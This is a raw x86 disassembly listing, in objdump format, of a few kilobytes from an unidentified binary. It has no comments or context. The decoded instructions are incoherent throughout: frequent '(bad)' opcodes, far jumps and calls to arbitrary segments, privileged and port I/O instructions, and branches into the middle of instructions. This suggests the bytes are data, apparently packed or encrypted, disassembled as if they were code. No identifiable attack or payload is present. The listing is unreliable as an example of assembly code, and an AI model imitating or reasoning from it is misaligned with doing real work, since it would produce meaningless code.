  41c9ba:	imul   edx,DWORD PTR [edx],0x89b5c1b8
  41c9c0:	popf   
  41c9c1:	inc    ecx
  41c9c2:	mov    dl,0x4
  41c9c4:	repz popa 
  41c9c6:	and    edi,edi
  41c9c8:	or     dl,BYTE PTR [ecx+0x3f200a2d]
  41c9ce:	add    BYTE PTR [esi],dl
  41c9d0:	lahf   
  41c9d1:	repz inc ecx
  41c9d3:	in     al,0xa
  41c9d5:	xchg   esi,eax
  41c9d6:	int    0xd4
  41c9d8:	test   al,0x82
  41c9da:	add    eax,esp
  41c9dc:	arpl   WORD PTR ds:0xc09af8ec,ax
  41c9e2:	retf   0x371d
  41c9e5:	inc    edx
  41c9e6:	rcr    DWORD PTR [edi],cl
  41c9e8:	aam    0x9c
  41c9ea:	add    DWORD PTR [esi+0x4ff4ddf2],ebp
  41c9f0:	retf   
  41c9f1:	push   edi
  41c9f2:	sti    
  41c9f3:	mov    cl,0xac
  41c9f5:	aaa    
  41c9f6:	jns    0x41ca63
  41c9f8:	mov    bl,0x10
  41c9fa:	call   0xff95:0xc9c73ac5
  41ca01:	mov    ch,0x72
  41ca03:	nop
  41ca04:	mov    cl,0xdf
  41ca06:	sahf   
  41ca07:	sub    BYTE PTR [eax],bl
  41ca09:	ins    BYTE PTR es:[edi],dx
  41ca0a:	call   0x3caa:0x4c31104a
  41ca11:	jmp    0x41c99b
  41ca13:	add    eax,ebx
  41ca15:	jg     0x41ca93
  41ca17:	out    dx,al
  41ca18:	and    bl,BYTE PTR [ebx]
  41ca1a:	push   es
  41ca1b:	bound  edx,QWORD PTR [ecx]
  41ca1d:	dec    ecx
  41ca1e:	mov    ebx,0xa1317b79
  41ca23:	dec    edi
  41ca24:	stc    
  41ca25:	inc    edx
  41ca26:	gs add bl,cl
  41ca29:	mov    dh,0x49
  41ca2b:	jno    0x41ca2b
  41ca2d:	aam    0x7
  41ca2f:	inc    esi
  41ca30:	int    0x98
  41ca32:	shr    esp,cl
  41ca34:	(bad)  
  41ca35:	sbb    al,0x86
  41ca37:	addr16 mov ah,0x78
  41ca3a:	push   esi
  41ca3b:	test   al,0xc1
  41ca3d:	aam    0xc5
  41ca3f:	mov    DWORD PTR [ebp+0xeca9faf],0x1d245fb5
  41ca49:	cmp    ebx,DWORD PTR cs:[esi+0x7d]
  41ca4d:	ins    BYTE PTR es:[edi],dx
  41ca4e:	cmp    al,0xc9
  41ca50:	pop    esi
  41ca51:	and    BYTE PTR [eax-0x5ebcd7a4],cl
  41ca57:	lock leave 
  41ca59:	and    BYTE PTR [edx+0x1fdd24b7],dh
  41ca5f:	mov    ecx,0xbef2ab85
  41ca64:	dec    ebp
  41ca65:	and    ah,al
  41ca67:	ins    BYTE PTR es:[edi],dx
  41ca68:	mov    esp,0xd5d76e08
  41ca6d:	adc    ch,BYTE PTR [ecx-0x40]
  41ca70:	retf   
  41ca71:	push   edi
  41ca72:	add    eax,0xf44be72e
  41ca77:	push   eax
  41ca78:	inc    ecx
  41ca79:	cmp    edx,DWORD PTR [eax]
  41ca7b:	xchg   ebp,eax
  41ca7c:	mov    DWORD PTR [edi-0x438fa54b],edx
  41ca82:	pushf  
  41ca83:	inc    esp
  41ca84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca85:	ret    
  41ca86:	inc    ebx
  41ca87:	inc    ebx
  41ca88:	xor    eax,0x891f38e2
  41ca8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca8e:	and    BYTE PTR [ecx],bl
  41ca90:	push   ebp
  41ca91:	add    al,0x8e
  41ca93:	mov    cl,0xde
  41ca95:	pop    ecx
  41ca96:	mov    edx,0x7ff25756
  41ca9b:	cs pop ds
  41ca9d:	lock inc eax
  41ca9f:	pop    edi
  41caa0:	nop
  41caa1:	add    eax,0xf2d91839
  41caa6:	add    BYTE PTR [eax+edi*8-0x15a165c2],0x7c
  41caae:	fs cmp eax,0x93ef502a
  41cab4:	jmp    DWORD PTR [eax]
  41cab6:	pop    es
  41cab7:	mov    bl,0x1d
  41cab9:	mov    ds:0x58d74a5e,eax
  41cabe:	and    eax,0x7a1649f8
  41cac3:	es inc edx
  41cac5:	addr16 adc esp,ebx
  41cac8:	xchg   edx,eax
  41cac9:	rcl    BYTE PTR [ecx],1
  41cacb:	pushf  
  41cacc:	jne    0x41cb11
  41cace:	mov    dl,BYTE PTR [ebp+0x63]
  41cad1:	cwde   
  41cad2:	shl    ch,1
  41cad4:	xor    dh,BYTE PTR [eax]
  41cad6:	dec    eax
  41cad7:	scas   al,BYTE PTR es:[edi]
  41cad8:	mov    ah,0x66
  41cada:	out    dx,al
  41cadb:	dec    ebp
  41cadc:	cmpxchg esp,ebx
  41cadf:	stos   BYTE PTR es:[edi],al
  41cae0:	nop
  41cae1:	sub    BYTE PTR [edx+ebx*8],dl
  41cae4:	test   BYTE PTR [ecx-0x3f],cl
  41cae7:	icebp  
  41cae8:	xor    bl,dl
  41caea:	ret    
  41caeb:	inc    ebx
  41caec:	jmp    0x2016:0xb891db3b
  41caf3:	divps  xmm2,xmm7
  41caf6:	dec    ebx
  41caf7:	clc    
  41caf8:	leave  
  41caf9:	ins    DWORD PTR es:[edi],dx
  41cafa:	retf   0xe777
  41cafd:	(bad)  
  41caff:	xchg   ebp,eax
  41cb00:	mov    eax,0xf9f2e286
  41cb05:	xchg   esp,eax
  41cb06:	and    esi,DWORD PTR [edx+esi*4-0x6bce1520]
  41cb0d:	inc    esi
  41cb0e:	popa   
  41cb0f:	mov    ds:0x59a434a0,al
  41cb14:	mov    al,ds:0x7a00eb3f
  41cb19:	out    0xc4,eax
  41cb1b:	outs   dx,DWORD PTR ds:[esi]
  41cb1c:	pop    edx
  41cb1d:	xor    ch,BYTE PTR ds:0x7aad7cd8
  41cb23:	stos   BYTE PTR es:[edi],al
  41cb24:	popa   
  41cb25:	ins    BYTE PTR es:[edi],dx
  41cb26:	scas   al,BYTE PTR es:[edi]
  41cb27:	and    ah,BYTE PTR [ecx]
  41cb29:	push   ebp
  41cb2a:	inc    ebp
  41cb2b:	retf   0x6927
  41cb2e:	pusha  
  41cb2f:	cmp    al,0x38
  41cb31:	test   DWORD PTR [esi-0x541305b9],ebx
  41cb37:	sbb    ebp,DWORD PTR [edi*4+0xb5bd4d0]
  41cb3e:	jecxz  0x41cb2e
  41cb40:	je     0x41cb00
  41cb42:	xchg   edx,eax
  41cb43:	pop    ebp
  41cb44:	fisttp WORD PTR [edx+eax*8]
  41cb47:	pop    esi
  41cb48:	(bad)  
  41cb4a:	popf   
  41cb4b:	fidivr WORD PTR [ebx+edi*8+0x15]
  41cb4f:	in     al,dx
  41cb50:	fimul  DWORD PTR [edi-0x4e9f4077]
  41cb56:	ins    DWORD PTR es:[edi],dx
  41cb57:	inc    eax
  41cb58:	dec    esi
  41cb59:	sahf   
  41cb5a:	push   eax
  41cb5b:	inc    edi
  41cb5c:	add    al,dh
  41cb5e:	popa   
  41cb5f:	shl    DWORD PTR [ecx-0x48],1
  41cb62:	mov    WORD PTR [eax+0x6a376d33],?
  41cb68:	clc    
  41cb69:	dec    DWORD PTR [eax+0x4f5091ec]
  41cb6f:	test   eax,0x91f31e82
  41cb74:	add    DWORD PTR [esp+esi*1],0xe201a4c2
  41cb7b:	inc    esi
  41cb7c:	pusha  
  41cb7d:	test   DWORD PTR [esi-0x37e75d15],esp
  41cb83:	cmp    edx,DWORD PTR [eax+0x2]
  41cb86:	mov    bl,0x2d
  41cb88:	inc    ecx
  41cb89:	xchg   BYTE PTR [ecx],dl
  41cb8b:	loopne 0x41cb2f
  41cb8d:	jg     0x41cb6b
  41cb8f:	ss lock mov esp,0x81e5a196
  41cb96:	mov    bh,0x13
  41cb98:	jg     0x41cbd1
  41cb9a:	clc    
  41cb9b:	sahf   
  41cb9c:	pop    edx
  41cb9d:	sbb    eax,0x8a8e6f12
  41cba3:	(bad)  
  41cba4:	xchg   ebp,eax
  41cba5:	mov    ebx,0xced1968f
  41cbaa:	popa   
  41cbab:	pop    esp
  41cbac:	inc    ecx
  41cbad:	jnp    0x41cbe8
  41cbaf:	sub    BYTE PTR [ebx-0x2d],dl
  41cbb2:	test   al,0xe1
  41cbb4:	in     al,0xa8
  41cbb6:	je     0x41cc37
  41cbb8:	sbb    eax,0x66154c67
  41cbbd:	push   ebp
  41cbbe:	pop    eax
  41cbbf:	pop    ecx
  41cbc0:	mov    ecx,0xbe9affe4
  41cbc5:	push   ebx
  41cbc6:	xchg   edx,eax
  41cbc7:	xlat   BYTE PTR ds:[ebx]
  41cbc8:	jge    0x41cc12
  41cbca:	xchg   edx,eax
  41cbcb:	cmp    DWORD PTR [ebx],ebx
  41cbcd:	pusha  
  41cbce:	or     cl,BYTE PTR [esi-0x791f4d6e]
  41cbd4:	or     dl,BYTE PTR [ebx+0x384a9ecf]
  41cbda:	pop    edx
  41cbdb:	xchg   ebx,eax
  41cbdc:	xchg   ecx,eax
  41cbdd:	retf   0x958a
  41cbe0:	sub    DWORD PTR [esi],ebp
  41cbe2:	sbb    DWORD PTR [esi+0x1bccd044],0xffffffd4
  41cbe9:	mov    esp,0xed81c101
  41cbee:	jmp    0x7f87:0x9c8f258d
  41cbf5:	ins    BYTE PTR es:[edi],dx
  41cbf6:	loopne 0x41cc4a
  41cbf8:	(bad)  
  41cbf9:	mov    cl,0x10
  41cbfb:	in     eax,dx
  41cbfc:	or     ecx,DWORD PTR [edi-0x6cea4062]
  41cc02:	stc    
  41cc03:	shl    bh,1
  41cc05:	je     0x41cc7d
  41cc07:	dec    eax
  41cc08:	arpl   WORD PTR [esi],dx
  41cc0a:	arpl   WORD PTR [eax+0x21],sp
  41cc0d:	hlt    
  41cc0e:	daa    
  41cc0f:	gs int 0x22
  41cc12:	xor    cl,dl
  41cc14:	xchg   ecx,eax
  41cc15:	cwde   
  41cc16:	popf   
  41cc17:	into   
  41cc18:	adc    ecx,0xda5a0696
  41cc1e:	xor    ebp,DWORD PTR ds:0xb3b562d9
  41cc24:	adc    edx,DWORD PTR [edx+0x1c]
  41cc27:	mov    DWORD PTR [ecx+eiz*4+0x50],eax
  41cc2b:	fidiv  WORD PTR ss:[edx+0x6d]
  41cc2f:	data16 ficom DWORD PTR [ecx+edi*4-0x1a058090]
  41cc37:	scas   eax,DWORD PTR es:[edi]
  41cc38:	xchg   ebp,eax
  41cc39:	lahf   
  41cc3a:	push   eax
  41cc3b:	and    al,0xd2
  41cc3d:	mov    edi,0x9ca5b65a
  41cc42:	addr16 stc 
  41cc44:	loop   0x41cc0c
  41cc46:	fs and edx,ebp
  41cc49:	xor    al,al
  41cc4b:	icebp  
  41cc4c:	jne    0x41cc2c
  41cc4e:	(bad)  
  41cc4f:	push   edi
  41cc50:	cs or  al,0x94
  41cc53:	or     eax,0x1f2a7e12
  41cc58:	or     BYTE PTR [ebx-0x13],dh
  41cc5b:	pop    ebx
  41cc5c:	popa   
  41cc5d:	cmp    dl,ch
  41cc5f:	or     ah,0x5c
  41cc62:	jl     0x41cc77
  41cc64:	cmp    DWORD PTR [eax-0x4ce8f9b6],esi
  41cc6a:	arpl   WORD PTR [ecx-0x5c],bp
  41cc6d:	push   esp
  41cc6e:	leave  
  41cc6f:	sahf   
  41cc70:	arpl   ax,sp
  41cc72:	sbb    bh,BYTE PTR [edx-0x58]
  41cc75:	mov    ds:0x59aa5f18,al
  41cc7a:	es scas eax,DWORD PTR es:[edi]
  41cc7c:	sub    DWORD PTR [edx-0x592f52c6],ebx
  41cc82:	into   
  41cc83:	fnstsw WORD PTR [ecx-0x25ee3b1d]
  41cc89:	add    eax,0x4bd81ff1
  41cc8e:	push   ds
  41cc8f:	sub    bl,bl
  41cc91:	jb     0x41cc5e
  41cc93:	imul   edx,DWORD PTR [esi+esi*4-0x59],0xd
  41cc98:	neg    DWORD PTR [edx]
  41cc9a:	push   ds
  41cc9b:	fisttp WORD PTR [esi]
  41cc9d:	lea    ecx,[edi+0x0]
  41cca0:	aas    
  41cca1:	cmp    ecx,DWORD PTR [edi+edx*2]
  41cca4:	add    al,0xa0
  41cca6:	push   esi
  41cca7:	dec    edi
  41cca8:	fbld   TBYTE PTR [eax+0x2b101f66]
  41ccae:	cmp    ebp,esi
  41ccb0:	into   
  41ccb1:	inc    ebx
  41ccb2:	adc    bh,BYTE PTR [edi]
  41ccb4:	jo     0x41ccff
  41ccb6:	inc    ebp
  41ccb7:	js     0x41cc57
  41ccb9:	fsubr  DWORD PTR ds:0xa3615dd8
  41ccbf:	popf   
  41ccc0:	xor    ecx,ebp
  41ccc2:	or     bh,cl
  41ccc4:	push   ecx
  41ccc5:	retf   0x44f
  41ccc8:	cwde   
  41ccc9:	and    ebp,DWORD PTR [ecx]
  41cccb:	ja     0x41cd18
  41cccd:	fs sub ebp,esp
  41ccd0:	push   edi
  41ccd1:	sbb    ecx,DWORD PTR [ebp+0x22]
  41ccd4:	jmp    0x62bd:0x6a9a175
  41ccdb:	adc    ebp,ebx
  41ccdd:	mov    eax,0xcdff056c
  41cce2:	out    0x80,eax
  41cce4:	mov    ebx,esi
  41cce6:	dec    ecx
  41cce7:	xor    ah,ah
  41cce9:	cwde   
  41ccea:	int3   
  41cceb:	hlt    
  41ccec:	fwait
  41cced:	add    BYTE PTR [ebp+0x61],dh
  41ccf0:	ins    BYTE PTR es:[edi],dx
  41ccf1:	pop    edi
  41ccf2:	mov    dl,0x52
  41ccf4:	icebp  
  41ccf5:	adc    ah,0xed
  41ccf8:	add    DWORD PTR [edx+0x30a4bcc8],edx
  41ccfe:	cmp    al,0xfe
  41cd00:	inc    edi
  41cd01:	shr    BYTE PTR [ebp+0x32],cl
  41cd04:	mov    ds:0x789a27de,al
  41cd09:	pop    eax
  41cd0a:	pop    ss
  41cd0b:	sbb    ebp,DWORD PTR [esi+0x783c7179]
  41cd11:	gs xchg edx,eax
  41cd13:	sub    dh,bh
  41cd15:	pop    eax
  41cd16:	adc    ecx,DWORD PTR ds:0x75c7adad
  41cd1c:	mov    ebp,ebx
  41cd1e:	mov    ah,0x80
  41cd20:	sbb    ch,0xfa
  41cd23:	and    eax,0x49421169
  41cd28:	push   0x74
  41cd2a:	dec    edx
  41cd2b:	or     eax,0x6e6fb0fb
  41cd30:	enter  0x4a5b,0x7e
  41cd34:	test   DWORD PTR [ecx-0x24daf506],ecx
  41cd3a:	test   eax,0x65f9e80c
  41cd3f:	sbb    BYTE PTR [ebp+0x10],0xb3
  41cd43:	(bad)  
  41cd44:	sar    DWORD PTR [edx],cl
  41cd46:	ret    
  41cd47:	push   esi
  41cd48:	cmc    
  41cd49:	jg     0x41cd74
  41cd4b:	clc    
  41cd4c:	jne    0x41cd00
  41cd4e:	test   BYTE PTR [esi-0x5d84d70],dl
  41cd54:	addr16 (bad) 
  41cd57:	and    ebp,DWORD PTR [ecx]
  41cd59:	arpl   WORD PTR [ebx+0x3949133c],si
  41cd5f:	pop    ss
  41cd60:	stos   DWORD PTR es:[edi],eax
  41cd61:	pop    esp
  41cd62:	cdq    
  41cd63:	gs scas eax,DWORD PTR es:[edi]
  41cd65:	loope  0x41cd9b
  41cd67:	sbb    al,0x13
  41cd69:	scas   al,BYTE PTR es:[edi]
  41cd6a:	jnp    0x41cdc2
  41cd6c:	loope  0x41cd1f
  41cd6e:	pop    eax
  41cd6f:	dec    ecx
  41cd70:	mov    bh,0x2d
  41cd72:	mov    dh,0x78
  41cd74:	mov    bl,0x1b
  41cd76:	adc    DWORD PTR [ecx],ebx
  41cd78:	pop    es
  41cd79:	mov    esp,0x2899a96f
  41cd7e:	push   0x7029c960
  41cd83:	xor    esp,ebp
  41cd85:	popf   
  41cd86:	add    BYTE PTR [ebp-0x60f39073],bl
  41cd8c:	and    DWORD PTR [edx+0x49],ebp
  41cd8f:	cld    
  41cd90:	push   edx
  41cd91:	or     cl,ah
  41cd93:	and    DWORD PTR [ebx-0x7e],edi
  41cd96:	fidivr DWORD PTR cs:[ebx-0x1a762f32]
  41cd9d:	fstp   DWORD PTR [edi-0x37]
  41cda0:	lea    esp,[edx]
  41cda2:	clc    
  41cda3:	push   0x836b670a
  41cda8:	pop    ds
  41cda9:	(bad)  
  41cdaa:	mov    edi,0xdac0c457
  41cdaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdb0:	shr    BYTE PTR [ebx],1
  41cdb2:	pop    es
  41cdb3:	aaa    
  41cdb4:	mov    esp,0x97b772fe
  41cdb9:	aam    0xd8
  41cdbb:	sub    bl,BYTE PTR [ebp-0x63]
  41cdbe:	add    eax,0x453fdaff
  41cdc3:	adc    eax,eax
  41cdc5:	inc    edx
  41cdc6:	inc    dx
  41cdc8:	fldcw  WORD PTR [esi]
  41cdca:	call   0x50a7:0xe2b4b64
  41cdd1:	loopne 0x41cd55
  41cdd3:	mov    dh,0x64
  41cdd5:	pop    ds
  41cdd6:	imul   BYTE PTR [ecx]
  41cdd8:	xor    bl,BYTE PTR [ecx+0xbaa029]
  41cdde:	mov    ebx,0x902943d5
  41cde3:	and    DWORD PTR [eax+0x4],edi
  41cde6:	mov    al,0xd1
  41cde8:	jns    0x41ce32
  41cdea:	int3   
  41cdeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdec:	or     DWORD PTR [ecx-0x3953d91c],esp
  41cdf2:	and    ch,BYTE PTR [edi]
  41cdf4:	aad    0xac
  41cdf6:	xchg   esp,eax
  41cdf7:	ret    0x5a18
  41cdfa:	inc    ebx
  41cdfb:	fistp  WORD PTR [eax]
  41cdfd:	mov    esi,DWORD PTR [eax]
  41cdff:	inc    ecx
  41ce00:	push   esi
  41ce01:	add    bl,BYTE PTR [ebp+0x1e]
  41ce04:	xor    edx,eax
  41ce06:	jne    0x41ce80
  41ce08:	inc    ecx
  41ce09:	jmp    0x41ce52
  41ce0b:	retf   0x2f2
  41ce0e:	add    esi,DWORD PTR [ecx]
  41ce10:	inc    eax
  41ce11:	pop    fs
  41ce13:	in     al,dx
  41ce14:	ins    BYTE PTR es:[edi],dx
  41ce15:	pop    edi
  41ce16:	out    0x9e,eax
  41ce18:	jae    0x41ce5b
  41ce1a:	push   edi
  41ce1b:	xor    eax,0x6082f372
  41ce20:	add    DWORD PTR [esi],0x80a0e6d0
  41ce26:	xor    BYTE PTR [edi-0x590feffa],dh
  41ce2c:	rcl    DWORD PTR [edi],1
  41ce2e:	mov    ds:0x7fa30305,eax
  41ce33:	jne    0x41ce12
  41ce35:	push   ds
  41ce36:	jmp    0x6af0:0xea867a70
  41ce3d:	mov    edi,0x6bf22964
  41ce42:	and    BYTE PTR [ecx-0x72],bl
  41ce45:	pop    ss
  41ce46:	in     eax,0x7d
  41ce48:	cli    
  41ce49:	js     0x41ce20
  41ce4b:	popf   
  41ce4c:	pop    edi
  41ce4d:	sbb    cl,bh
  41ce4f:	mov    bh,0xd8
  41ce51:	mov    BYTE PTR [esp+edx*2],ch
  41ce54:	test   al,0x5f
  41ce56:	mov    al,0x84
  41ce58:	scas   eax,DWORD PTR es:[edi]
  41ce59:	in     al,dx
  41ce5a:	int3   
  41ce5b:	adc    ch,BYTE PTR ds:0x683142d9
  41ce61:	add    al,0x21
  41ce63:	lahf   
  41ce64:	sar    DWORD PTR [edx-0x112bb729],0x5f
  41ce6b:	adc    ecx,DWORD PTR [ebx]
  41ce6d:	or     BYTE PTR [eax+0x30c15c9d],bl
  41ce73:	mov    al,0xc
  41ce75:	mov    fs,WORD PTR [esi-0x2d665678]
  41ce7b:	pop    esi
  41ce7c:	mov    bl,0xd7
  41ce7e:	(bad)  
  41ce7f:	pop    ecx
  41ce80:	mov    cl,0x0
  41ce82:	push   ecx
  41ce83:	nop
  41ce84:	aam    0xcd
  41ce86:	and    eax,0x3cab30da
  41ce8b:	add    BYTE PTR [ecx],dl
  41ce8d:	out    dx,eax
  41ce8e:	push   cs
  41ce8f:	mov    esp,0x8d3e60b1
  41ce94:	add    al,0x7
  41ce96:	dec    eax
  41ce97:	call   FWORD PTR ds:0x32d7698e
  41ce9d:	inc    eax
  41ce9e:	out    0x7a,al
  41cea0:	cmp    eax,0x780ac27b
  41cea5:	sbb    DWORD PTR [esi],ecx
  41cea7:	mov    dl,0x52
  41cea9:	fdiv   DWORD PTR [esi+ebx*8]
  41ceac:	cmc    
  41cead:	test   DWORD PTR [edx-0x7ed4196a],0x146e9e68
  41ceb7:	call   0x9fb9affb
  41cebc:	shl    DWORD PTR [edi-0x437f5c60],cl
  41cec2:	inc    ebp
  41cec3:	jne    0x41ce85
  41cec5:	in     eax,0x32
  41cec7:	mov    ds:0xd6c79e4d,eax
  41cecc:	test   DWORD PTR [edx+0x6405488d],esp
  41ced2:	jle    0x41ced1
  41ced4:	jmp    0x41cebf
  41ced6:	arpl   di,bp
  41ced8:	pop    ecx
  41ced9:	xor    BYTE PTR [eax-0x6d],dh
  41cedc:	sub    al,0x7c
  41cede:	std    
  41cedf:	xchg   ecx,eax
  41cee0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cee1:	loop   0x41ce63
  41cee3:	xchg   DWORD PTR [ecx+eax*4-0x6b009787],eax
  41ceea:	xor    ch,ah
  41ceec:	pop    ds
  41ceed:	cmp    BYTE PTR [edi+0x62],bh
  41cef0:	jle    0x41ce77
  41cef2:	add    bh,dh
  41cef4:	cli    
  41cef5:	aaa    
  41cef6:	cmp    al,ch
  41cef8:	loop   0x41cf75
  41cefa:	cmc    
  41cefb:	jg     0x41cf2c
  41cefd:	enter  0xab88,0x42
  41cf01:	adc    BYTE PTR [eax],0xa4
  41cf04:	pop    ds
  41cf05:	mov    bh,0x62
  41cf07:	cmp    BYTE PTR [edx+0x11c8bb27],ch
  41cf0d:	adc    DWORD PTR [ecx],ecx
  41cf0f:	mov    bh,BYTE PTR [ecx+0x4ed69d1c]
  41cf15:	out    dx,al
  41cf16:	inc    edi
  41cf17:	ucomiss xmm6,xmm5
  41cf1a:	ins    BYTE PTR es:[edi],dx
  41cf1b:	inc    esp
  41cf1c:	in     eax,dx
  41cf1d:	cmp    eax,0x75e6c3b2
  41cf22:	into   
  41cf23:	in     al,0xfd
  41cf25:	dec    eax
  41cf26:	stc    
  41cf27:	mov    BYTE PTR [edi+ebp*4-0x13],dh
  41cf2b:	add    ah,cl
  41cf2d:	push   ecx
  41cf2e:	sbb    cl,BYTE PTR [edi+0x74abce61]
  41cf34:	stos   BYTE PTR es:[edi],al
  41cf35:	xchg   ebp,eax
  41cf36:	test   BYTE PTR [edi+0x70161ef3],bl
  41cf3c:	add    eax,0x24d70fa0
  41cf41:	call   0x8db4:0x5208bc
  41cf48:	add    ebp,0x895432d6
  41cf4e:	sub    DWORD PTR [ebx],0xc40d45bf
  41cf54:	add    DWORD PTR [ebx+0xb],ebp
  41cf57:	in     al,dx
  41cf58:	dec    eax
  41cf59:	call   0x1e954146
  41cf5e:	adc    al,0x3b
  41cf60:	loopne 0x41cf4a
  41cf62:	inc    eax
  41cf63:	jge    0x41cf51
  41cf65:	adc    ebp,esi
  41cf67:	push   ebx
  41cf68:	lods   al,BYTE PTR ds:[esi]
  41cf69:	xchg   edx,eax
  41cf6a:	jmp    0xbe86a95e
  41cf6f:	mov    esp,edx
  41cf71:	mov    esi,0xe3f65142
  41cf76:	pop    esp
  41cf77:	jo     0x41cfa9
  41cf79:	or     edx,ebp
  41cf7b:	les    edi,FWORD PTR [bx+di]
  41cf7e:	mov    dh,0x75
  41cf80:	(bad)  
  41cf81:	shr    BYTE PTR [ecx],cl
  41cf83:	(bad)  
  41cf84:	jo     0x41cf13
  41cf86:	xor    ah,ah
  41cf88:	data16 and al,0x46
  41cf8b:	xor    esp,DWORD PTR [eax+edi*8]
  41cf8e:	cwde   
  41cf8f:	cmp    al,0x9
  41cf91:	das    
  41cf92:	stc    
  41cf93:	aad    0x2b
  41cf95:	es cmc 
  41cf97:	sbb    BYTE PTR [eax-0x429e1f0c],ah
  41cf9d:	js     0x41cfcd
  41cf9f:	cmp    BYTE PTR [esi],dl
  41cfa1:	cmc    
  41cfa2:	push   edx
  41cfa3:	cmp    DWORD PTR [edx+0x3369b1c5],edi
  41cfa9:	daa    
  41cfaa:	fidivr WORD PTR [edx+ebx*1-0x3aec85a6]
  41cfb1:	aaa    
  41cfb2:	jmp    0x36ae:0xb69cdaa
  41cfb9:	bnd repz gs jno 0x41d010
  41cfbe:	pop    edx
  41cfbf:	es aad 0xde
  41cfc2:	mov    ebx,0x401cc3e4
  41cfc7:	hlt    
  41cfc8:	je     0x41d002
  41cfca:	repnz mov dh,0xae
  41cfcd:	sahf   
  41cfce:	cmp    esp,DWORD PTR [ebx]
  41cfd0:	pop    eax
  41cfd1:	push   0x46248f3
  41cfd6:	push   eax
  41cfd7:	mov    ss,WORD PTR [ecx+0x64]
  41cfda:	sub    BYTE PTR [edx+0x76],bl
  41cfdd:	mov    ds:0x903303b8,eax
  41cfe2:	ret    
  41cfe3:	stc    
  41cfe4:	or     DWORD PTR [ecx+0x53],esi
  41cfe7:	mov    al,0x31
  41cfe9:	inc    DWORD PTR [edx+0x73]
  41cfec:	rcr    edx,1
  41cfee:	pop    edx
  41cfef:	pop    ecx
  41cff0:	jg     0x41cfa8
  41cff2:	sbb    al,0xa9
  41cff4:	adc    al,0x1c
  41cff6:	lahf   
  41cff7:	test   eax,0xf50bb14d
  41cffc:	sub    DWORD PTR [eax-0x168bed0b],ebx
  41d002:	push   es
  41d003:	add    DWORD PTR [ebp+eiz*8+0x9515c4],eax
  41d00a:	aaa    
  41d00b:	ins    DWORD PTR es:[edi],dx
  41d00c:	inc    esi
  41d00d:	mov    ebp,0x5b46f32b
  41d012:	shr    BYTE PTR [edi+edi*4+0x57aa1060],cl
  41d019:	dec    edx
  41d01a:	(bad)  
  41d01b:	aaa    
  41d01c:	add    eax,0x43e37d24
  41d021:	add    eax,0xc61f47ae
  41d026:	push   cs
  41d027:	mov    ch,0x1d
  41d029:	xchg   BYTE PTR [edx+edx*8-0x32],cl
  41d02d:	jo     0x41d05b
  41d02f:	mov    eax,ds:0xccaad3db
  41d034:	sbb    eax,0x6cd2c8c
  41d039:	or     DWORD PTR [ebx+0x75b44de7],esp
  41d03f:	imul   dx,WORD PTR [eax],0xc9a0
  41d044:	jp     0x41d073
  41d046:	cmp    al,bl
  41d048:	pop    edi
  41d049:	mov    esi,0x584b60e7
  41d04e:	cmc    
  41d04f:	fdiv   DWORD PTR [eax+0x3f2c58e6]
  41d055:	add    DWORD PTR [esi],esp
  41d057:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d058:	push   esi
  41d059:	cmc    
  41d05a:	out    0x2f,al
  41d05c:	inc    esi
  41d05d:	xchg   edx,eax
  41d05e:	ror    BYTE PTR [edi+ebx*8-0x7e],0xad
  41d063:	in     al,0x9d
  41d065:	mov    ch,0xc6
  41d067:	loope  0x41cff4
  41d069:	sar    DWORD PTR [edx-0x5f],cl
  41d06c:	out    0x6f,eax
  41d06e:	je     0x41d096
  41d070:	rol    dl,cl
  41d072:	mov    edi,0xaf5e5602
  41d077:	xlat   BYTE PTR ds:[ebx]
  41d078:	rcl    BYTE PTR [ebx],cl
  41d07a:	sub    DWORD PTR [edx-0x7185adfa],esi
  41d080:	dec    edi
  41d081:	jge    0x41d044
  41d083:	lods   al,BYTE PTR ds:[esi]
  41d084:	repz dec ebp
  41d086:	mov    esp,0xccfebc2d
  41d08b:	mov    ebp,0xa155bdd4
  41d090:	or     BYTE PTR [ebx+0x570cb65d],bh
  41d096:	dec    ecx
  41d097:	fwait
  41d098:	xor    al,0x7e
  41d09a:	push   es
  41d09b:	je     0x41d056
  41d09d:	ss or  eax,edx
  41d0a0:	pop    edx
  41d0a1:	sbb    DWORD PTR [eax+0x2c],ecx
  41d0a4:	inc    ebp
  41d0a5:	sbb    BYTE PTR [ebx],bl
  41d0a7:	jle    0x41d087
  41d0a9:	ffree  st(1)
  41d0ab:	je     0x41d037
  41d0ad:	xchg   edx,eax
  41d0ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0af:	pop    ss
  41d0b0:	mov    edx,0x3403fd70
  41d0b5:	fcomp  DWORD PTR [ecx+0x79]
  41d0b8:	inc    ebp
  41d0b9:	mov    cs,WORD PTR [esi-0x14ca6354]
  41d0bf:	dec    eax
  41d0c0:	shl    DWORD PTR [edx-0x3bbc891e],1
  41d0c6:	iret   
  41d0c7:	hlt    
  41d0c8:	inc    ebp
  41d0c9:	jmp    DWORD PTR ds:0x72ebb7d
  41d0cf:	pop    esi
  41d0d0:	imul   esp,ebx,0x3a2cabf5
  41d0d6:	ret    0x128f
  41d0d9:	es cmc 
  41d0db:	fwait
  41d0dc:	push   ss
  41d0dd:	dec    dh
  41d0df:	sbb    DWORD PTR [eax+0x6945fe2d],ecx
  41d0e5:	(bad)  
  41d0e6:	jecxz  0x41d163
  41d0e8:	cld    
  41d0e9:	lock out dx,eax
  41d0eb:	push   eax
  41d0ec:	sub    DWORD PTR [esi+0x7d],edi
  41d0ef:	repz mov bl,0x38
  41d0f2:	psubusw mm6,QWORD PTR [edi-0x3269efa]
  41d0f9:	scas   eax,DWORD PTR es:[edi]
  41d0fa:	mov    esp,0x5fbb8405
  41d0ff:	mov    dh,BYTE PTR [edx-0x7450658e]
  41d105:	and    cl,BYTE PTR [edx+0x7]
  41d108:	loop   0x41d0e2
  41d10a:	fimul  WORD PTR [edx+0x68]
  41d10d:	add    al,dh
  41d10f:	mov    al,ds:0x46e236eb
  41d114:	push   ecx
  41d115:	xchg   ebp,eax
  41d116:	fidiv  DWORD PTR [ecx+0x46]
  41d119:	mov    esp,0x6d7b020b
  41d11e:	adc    eax,0xcb1b594c
  41d123:	mov    al,ds:0x813329b4
  41d128:	sti    
